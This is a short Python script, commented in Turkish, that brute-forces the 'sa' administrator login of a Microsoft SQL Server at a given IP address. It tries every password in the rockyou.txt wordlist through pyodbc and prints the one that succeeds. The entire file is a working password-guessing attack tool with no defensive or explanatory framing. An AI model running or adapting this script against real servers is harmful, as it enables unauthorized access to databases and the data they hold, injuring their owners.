import pyodbc

IP="192.168.43.16"  # SQL Sunucunun kurulu olduğu bilgisayara ait IP adresi
wordlist=open('rockyou.txt','r')
for sifre in  wordlist:
    try:
        password=sifre[:len(sifre)-1]
        connection = pyodbc.connect('DRIVER={SQL Server};SERVER='+IP+';DATABASE=MASTER;UID=sa;PWD='+str(password)+'')
        print("Giriş Başarılı Parola= "+password)
        break
    except:
        print(str(password)+" Parola yanlış")
